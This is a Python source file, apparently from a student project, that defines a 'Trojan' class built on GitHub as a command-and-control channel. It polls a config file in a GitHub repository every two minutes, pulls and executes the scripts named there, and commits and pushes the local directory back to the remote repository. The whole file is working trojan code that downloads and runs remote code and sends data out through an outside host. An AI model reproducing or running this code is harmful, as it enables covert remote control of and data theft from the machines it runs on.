import os
import time
import requests
import base64
import importlib
import importlib.machinery
import importlib.util
from git import Repo
from dotenv import load_dotenv

load_dotenv()


class Trojan:
    def __init__(self):
        self.local_dir = "C:/Users/bernd/OneDrive - AP Hogeschool Antwerpen/School 22-23 semester 2/Python " \
                         "Developement/python-trojan"
        self.username = "BerrieV1"
        self.access_token = os.getenv("PAT")
        self.repo = "python-trojan"

    def run(self):
        while True:
            self.check(self.username, self.repo, "config/config.txt")
            self.push_git_repo(self.local_dir)
            print("Done")
            time.sleep(120)

    def check(self, username, repo, file_path):
        url = f"https://api.github.com/repos/{username}/{repo}/contents/{file_path}?ref=master"
        headers = {"Authorization": f"Bearer {self.access_token}"}
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            file_content = response.json()["content"]
            decoded_content = base64.b64decode(file_content).decode("utf-8")
            words = decoded_content.split()
            if len(words) > 0:
                for word in words:
                    self.import_module(word.capitalize())

    def import_module(self, module_name):
        try:
            module = importlib.import_module(module_name)
        except ImportError:
            self.pull_git_repo(self.local_dir)
            spec = importlib.util.spec_from_file_location(module_name,
                                                          f"{self.local_dir}/scripts/{module_name.lower()}.py")
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
        self.run_module(module)

    def pull_git_repo(self, local_dir):
        repo = Repo(local_dir)
        origin = repo.remote("origin")
        origin.fetch()
        origin.pull(repo.active_branch.name)

    def push_git_repo(self, local_dir):
        repo = Repo(local_dir)
        repo.git.add(".")
        repo.git.commit("-m", "update trojan")
        origin = repo.remote("origin")
        origin.set_url(f"https://{self.username}:{self.access_token}@github.com/{self.username}/{self.repo}"
                       f".git")
        origin.push()

    def run_module(self, module):
        module_class = getattr(module, module.__name__)
        instance = module_class()
        instance.install_requirements()
        instance.run()


def main():
    trojan = Trojan()
    trojan.run()


if __name__ == '__main__':
    main()
